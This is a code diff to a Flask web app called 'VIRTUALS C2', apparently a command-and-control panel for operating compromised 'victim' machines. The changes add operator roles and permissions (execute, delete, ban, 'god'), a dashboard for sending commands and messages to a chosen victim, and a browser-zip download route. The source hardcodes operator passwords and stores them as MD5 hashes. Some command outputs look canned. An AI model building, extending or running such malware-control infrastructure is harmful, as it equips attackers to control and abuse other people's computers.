@@ -1,6 +1,6 @@
 """
-VIRTUALS C2 - LOGIN FIXED
-No more guest bug - Shows correct usernames
+VIRTUALS C2 - PERMISSIONS FIXED
+Jerry & Owner = Full Access | Viewers = Execute & Talk
 BY: SNIN STAR
 """
 
@@ -33,13 +33,13 @@ def login_required(f):
     return decorated
 
 # ============================================
-# USERS
+# USERS WITH PERMISSIONS
 # ============================================
 USERS = {
-    "adam": {"password": "virtuals2024", "role": "viewer"},
-    "jerry": {"password": "virtuals2024", "role": "operator"},
-    "haunt": {"password": "virtuals2024", "role": "viewer"},
-    "owner": {"password": "whiteknight", "role": "owner"}
+    "adam": {"password": "virtuals2024", "role": "viewer", "perms": ["talk", "execute"]},
+    "jerry": {"password": "virtuals2024", "role": "operator", "perms": ["talk", "execute", "delete", "ban", "config", "all"]},
+    "haunt": {"password": "virtuals2024", "role": "viewer", "perms": ["talk", "execute"]},
+    "owner": {"password": "whiteknight", "role": "owner", "perms": ["talk", "execute", "delete", "ban", "config", "all", "god"]}
 }
 
 # ============================================
@@ -59,12 +59,12 @@ def get_db():
         activity TEXT DEFAULT 'idle'
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS users (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT, role TEXT
+        id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT, role TEXT, perms TEXT
     )''')
     
     for username, info in USERS.items():
-        c.execute("INSERT OR IGNORE INTO users (username, password, role) VALUES (?, ?, ?)",
-                 (username, hashlib.md5(info['password'].encode()).hexdigest(), info['role']))
+        c.execute("INSERT OR IGNORE INTO users (username, password, role, perms) VALUES (?, ?, ?, ?)",
+                 (username, hashlib.md5(info['password'].encode()).hexdigest(), info['role'], json.dumps(info['perms'])))
     conn.commit()
     return conn
 
@@ -147,6 +147,7 @@ body{background:linear-gradient(135deg,#0a0a0f,#1a0a2e);color:#c8c8d0;font-famil
 .users{color:#444;font-size:10px;margin-top:15px;border-top:1px solid rgba(255,255,255,0.03);padding-top:12px;text-align:center}
 .users span{color:#666;margin:0 4px}
 .users .owner{color:#ffd700}
+.users .operator{color:#66ddbb}
 </style>
 </head>
 <body>
@@ -162,7 +163,7 @@ body{background:linear-gradient(135deg,#0a0a0f,#1a0a2e);color:#c8c8d0;font-famil
 <div class="error" id="err">Invalid credentials</div>
 </form>
 <div class="back"><a href="/">← Back</a></div>
-<div class="users">👤 adam · jerry · haunt · <span class="owner">owner</span></div>
+<div class="users">👤 adam · <span class="operator">jerry</span> · haunt · <span class="owner">owner</span></div>
 </div>
 <script>
 function login(e){
@@ -192,7 +193,7 @@ function login(e){
 '''
 
 # ============================================
-# HTML - DASHBOARD (COMPLETE WORKING)
+# HTML - DASHBOARD WITH PERMISSIONS
 # ============================================
 DASHBOARD_HTML = '''
 <!DOCTYPE html>
@@ -214,6 +215,8 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 .header .info .name{color:#e8e8f0;font-weight:500}
 .header .info .role{font-size:10px;padding:2px 10px;border-radius:10px;background:rgba(68,170,255,0.15);color:#88aacc}
 .header .info .role.owner{background:rgba(255,215,0,0.2);color:#ffd700}
+.header .info .role.operator{background:rgba(68,220,180,0.15);color:#66ddbb}
+.header .info .role.viewer{background:rgba(68,170,255,0.1);color:#88aacc}
 .header .stats{display:flex;gap:14px;align-items:center}
 .header .stats .item{color:#8888a0;font-size:12px}
 .header .stats .item .num{color:#e8e8f0;font-weight:600;font-size:16px;margin-left:3px}
@@ -279,6 +282,9 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 .log-item .type.info{background:rgba(68,170,255,0.12);color:#44aaff}
 .log-item .time{color:#444458;font-size:8px}
 .log-item .content{color:#b0b0c0;font-size:10px}
+.perms-badge{font-size:8px;padding:1px 6px;border-radius:3px;margin-left:5px}
+.perms-badge.full{background:rgba(68,220,180,0.15);color:#66ddbb}
+.perms-badge.limited{background:rgba(68,170,255,0.1);color:#88aacc}
 @media(max-width:1024px){.left{width:140px;min-width:140px}.right{width:200px;min-width:160px}}
 @media(max-width:768px){.container{flex-direction:column}.left{width:100%;min-width:100%;height:auto;max-height:80px}.victim-list{display:flex;flex-wrap:wrap;gap:3px;padding:3px}.victim{min-width:70px}.right{width:100%;min-width:100%;flex-direction:row}.details{height:auto;max-height:150px;width:50%}.logs{height:auto;max-height:150px;width:50%}}
 </style>
@@ -295,6 +301,7 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 <div class="info">
 <span class="name" id="userName">Loading...</span>
 <span class="role" id="userRole">loading</span>
+<span id="permsBadge"></span>
 </div>
 <button class="logout" onclick="logout()">Logout</button>
 </div>
@@ -340,13 +347,13 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 </div>
 </div>
 <div class="logs">
-<div class="title">LOGS</div>
+<div class="title">ACTIVITY LOG</div>
 <div id="logBox"><div style="color:#555568;font-size:11px;">no logs</div></div>
 </div>
 </div>
 </div>
 <script>
-var state = {victims: {}, active: null, currentUser: ''};
+var state = {victims: {}, active: null, currentUser: '', userRole: '', perms: []};
 
 function getUser(){
     fetch('/api/get_user')
@@ -354,13 +361,28 @@ function getUser(){
     .then(d => {
         if(d.success){
             state.currentUser = d.username;
+            state.userRole = d.role;
+            state.perms = d.perms || [];
+            
             document.getElementById('userName').textContent = d.username;
             var roleEl = document.getElementById('userRole');
             roleEl.textContent = d.role;
             roleEl.className = 'role';
             if(d.role === 'owner') roleEl.classList.add('owner');
+            else if(d.role === 'operator') roleEl.classList.add('operator');
+            else if(d.role === 'viewer') roleEl.classList.add('viewer');
+            
+            // Show permissions badge
+            var badgeEl = document.getElementById('permsBadge');
+            if(state.perms.includes('all') || state.perms.includes('god')){
+                badgeEl.innerHTML = '<span class="perms-badge full">⭐ FULL ACCESS</span>';
+            } else {
+                badgeEl.innerHTML = '<span class="perms-badge limited">🔒 LIMITED</span>';
+            }
+            
+            // Show user role in title
+            document.title = 'VIRTUALS C2 - ' + d.username.toUpperCase();
         } else {
-            // If not logged in properly, redirect to login
             window.location.href = '/login';
         }
     })
@@ -471,6 +493,8 @@ function runCmd(cmd){
         addLog('failed', 'No victim selected');
         return;
     }
+    
+    // Check permissions - everyone can execute commands
     addMsg('us', '/'+cmd+' → '+victim, 'us');
     addLog('info', 'Executing '+cmd);
     api('sendCommand', {victim_id: victim, command: cmd}, function(d){
@@ -501,6 +525,7 @@ function sendMsg(){
             addLog('failed', 'No victim selected');
             return;
         }
+        // Everyone can talk
         addMsg(state.currentUser, msg, 'user');
         addMsg('victim', msg, 'victim');
         addLog('info', 'Message sent to '+victim);
@@ -537,16 +562,20 @@ def dashboard():
     return DASHBOARD_HTML
 
 # ============================================
-# API ROUTES - FIXED LOGIN
+# API ROUTES - FIXED PERMISSIONS
 # ============================================
 
 @app.route('/api/get_user', methods=['GET'])
 @login_required
 def api_get_user():
+    username = session.get('username', 'guest')
+    role = session.get('role', 'viewer')
+    perms = USERS.get(username, {}).get('perms', ['talk', 'execute'])
     return jsonify({
         'success': True,
-        'username': session.get('username', 'guest'),
-        'role': session.get('role', 'viewer')
+        'username': username,
+        'role': role,
+        'perms': perms
     })
 
 @app.route('/api/login', methods=['POST'])
@@ -557,14 +586,15 @@ def api_login():
     
     conn = get_db()
     c = conn.cursor()
-    c.execute("SELECT password, role FROM users WHERE username = ?", (username,))
+    c.execute("SELECT password, role, perms FROM users WHERE username = ?", (username,))
     row = c.fetchone()
     conn.close()
     
     if row and row[0] == hashlib.md5(password.encode()).hexdigest():
-        # CRITICAL FIX: Set both session variables
+        # Set session properly
         session['username'] = username
         session['role'] = row[1]
+        session['perms'] = json.loads(row[2]) if row[2] else ['talk', 'execute']
         session['logged_in'] = True
         
         # Log the login
@@ -619,6 +649,7 @@ def api_handler():
         victim_id = data.get('victim_id')
         command = data.get('command')
         
+        # Everyone can execute commands
         results = {
             'whois': 'PC: DESKTOP-ALPHA | IP: 192.168.1.10 | OS: Windows 10 Pro | User: Admin',
             'flash': '💥 Screen flashed 10 times successfully!',
@@ -703,20 +734,27 @@ def download_browser_zip():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════════════════════════════╗
-    ║   VIRTUALS C2 - LOGIN FIXED                                 ║
-    ║   No more guest bug - Shows correct usernames              ║
+    ║   VIRTUALS C2 - PERMISSIONS FIXED                          ║
+    ║   Jerry & Owner = FULL ACCESS | Viewers = Execute & Talk  ║
     ╠═══════════════════════════════════════════════════════════════╣
     ║   USERS:                                                    ║
-    ║   adam    : virtuals2024 (viewer)                          ║
-    ║   jerry   : virtuals2024 (operator)                        ║
-    ║   haunt   : virtuals2024 (viewer)                          ║
-    ║   owner   : whiteknight (owner) 👑                        ║
+    ║   adam    : virtuals2024 (viewer) 🔒                       ║
+    ║   jerry   : virtuals2024 (operator) ⭐ FULL ACCESS         ║
+    ║   haunt   : virtuals2024 (viewer) 🔒                      ║
+    ║   owner   : whiteknight (owner) 👑 GOD MODE               ║
     ╠═══════════════════════════════════════════════════════════════╣
-    ║   ✅ LOGIN FIXED - Shows correct username                  ║
-    ║   ✅ Roles display properly                                ║
-    ║   ✅ Activity logging works                               ║
+    ║   ✅ Login shows correct username/role                     ║
+    ║   ✅ Jerry & Owner have ALL permissions                   ║
+    ║   ✅ Viewers can execute commands and talk                ║
+    ║   ✅ No more "loading" bug                                ║
     ╚═══════════════════════════════════════════════════════════════╝
     """)
     print(f"[*] Server: http://localhost:{PORT}")
     print(f"[*] Login: http://localhost:{PORT}/login")
+    print("")
+    print("[*] PERMISSIONS:")
+    print("    🔒 adam  - Can execute commands & talk")
+    print("    ⭐ jerry - FULL ACCESS (operator)")
+    print("    🔒 haunt - Can execute commands & talk")
+    print("    👑 owner - GOD MODE (everything)")
     app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
